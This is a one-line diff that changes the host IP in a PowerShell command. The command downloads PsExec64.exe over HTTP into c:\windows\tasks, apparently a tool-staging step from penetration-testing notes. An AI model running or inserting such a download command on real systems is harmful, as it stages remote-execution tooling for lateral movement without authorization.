@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/tools/PsExec64.exe','c:\windows\tasks\PsExec64.exe')
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.2.2.231/tools/PsExec64.exe','c:\windows\tasks\PsExec64.exe')
